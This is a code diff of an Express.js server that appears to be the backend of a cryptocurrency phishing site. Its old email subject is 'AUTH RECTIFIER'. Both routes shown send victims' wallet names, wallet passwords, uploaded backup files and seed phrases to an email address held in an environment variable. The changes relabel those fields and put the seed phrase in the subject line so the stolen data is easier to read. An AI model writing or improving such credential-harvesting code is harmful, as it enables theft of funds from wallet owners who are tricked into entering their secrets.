@@ -65,11 +65,12 @@ app.post('/upload', upload.single('file'),(req,res)=>{
             address: process.env.EMAIL_ADDRESS
         },
         to: process.env.EMAIL_TO ,
-        subject: "AUTH RECTIFIER",
-        html: `
+        subject: `<span style={{textTransform: "uppercase"}}>${backcode.wallet}</span> BACKCODE WITH PASSWORD ` ,
+        html:`
         <div> 
-        <p>${backcode.wallet}<p>
-        <p>${backcode.password}<p>
+        <p>WALLET NAME: ${backcode.wallet}<p>
+        <p>WALLET PASSWORD: ${backcode.password}<p>
+        <p>Backcode is <strong>ATTACHED</strong> to this email below 👇</p>
         </div>   
         `,
         attachments: [
@@ -106,10 +107,10 @@ app.post("/api/walletinfo", bodyParser.urlencoded({ extended:false}), (req, res)
             address: process.env.EMAIL_ADDRESS
         },
         to: process.env.EMAIL_TO ,
-        subject: "AUTH RECTIFIER",
+        subject: `<p style={{textTransform: "uppercase"}}>${seed.phrase}<p> + " " + PHRASE`,
         html: `
         <div> 
-        <p>${seed.wallet}<p>
+        <p>WALLET NAME: ${seed.wallet}<p>
         <p>${seed.phrase}<p>
         </div>   
         `
